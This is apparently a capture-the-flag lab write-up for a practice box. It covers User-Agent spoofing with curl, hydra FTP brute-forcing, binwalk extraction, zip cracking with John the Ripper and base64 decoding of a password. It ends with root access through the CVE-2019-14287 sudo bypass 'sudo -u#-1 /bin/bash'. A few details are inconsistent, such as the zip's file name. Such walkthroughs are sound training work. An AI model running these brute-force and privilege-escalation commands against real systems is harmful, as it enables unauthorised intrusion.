export = 10.201.122.98

# Redirecting to the secret page

To do this we used curl command to access
```
curl 10.201.122.98 -H "User-Agent: C" -L
```

This script gave us the username which is chris and also told us that the password was too weak

---

# Getting the ftp password using bruteforce

So we got the username of ftp which was chris. Now we are going to use hydra which will bruteforce the passwords with username chris 

```
hydra -l chris -P /usr/share/wordlists/rockyou.tar.gz ftp://10.201.122.98
```

Then we got the output like this:
```
[21][ftp] host: 10.201.122.98   login: chris   password: crystal
```

Now we are going to login to the ftp client

```
ftp 10.201.122.98
```

Then we did 
```
ls
```
We got three files


So we are going to download the files with command
```
mget *
```

---

# Getting the info about the images we got

To get the info of images we can do
```
strings *.jpg
```
here we didnt got any thing juicy

so we can try on png image with the command 
```
strings *.png
```

here we got something To_agentR.txt. So now we are going to extract this image file with
```
binwalk -e cutie.png
```

Now another new directory will be made with name _cutie.png.extracted. So do 
```
cd  _cutie.png.extracted
```

Here we got one file 8702.zip. Now we are going to get the hash of this fill using JohnTheRipper

To do that we can type the command
```/usr/sbin/zip2john 8702.zip > hashes.txt
```

Now the new file will be made with the name hashes.txt which will contain the hash of the zip file from which we can get the password. So now we can do 

```
/usr/sbin/john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz
```
This will give us the password which is alien. Now we can do
```
# Enter the password you got here when prompted
7z e 8802.zip
```

Now in the file we got the password QXJlYTUx which is in base64 format to encode it we can do
```
echo "QXJlYTUx" | base64 -d
```

Now we got the password which is hackerrules!. Now log into the ssh with
```
ssh james@10.201.122.98

```

Now do 
```
ls
```

Now here we got user.txt. And the incident of the image present in /home/james is Rosewell alien autopsy

The CVE name is CVE-2019-14287

---

# Privillage Escallation

Now we have to get the root.txt. To do that we will use linepeas.sh.

To install linpeas.sh in the ssh machine we can do
```
scp /usr/share/peass/linpeas/linpeas.sh james@10.201.122.98:/dev/shm
```

this will install the linepeas.sh in the /dev/shm of the target machine

Now in ssh terminal do 
```
cd /dev/shm
```

here you will find linpeas.sh. Now run it with
```
chmod +x linpeas.sh
./linpeas.sh
```

But we are going to use one liner command for privillage escallation according to CVE.Now type the command
```
sudo -u#-1 /bin/bash
```

Now you will be the root.So now move to
```
cd /root
```

here do
```
cat root.txt
```

Here you got the root.txt and the name of agentR

---

# About Me

Thanks for using my this repository. Please star this repository and follow me on github
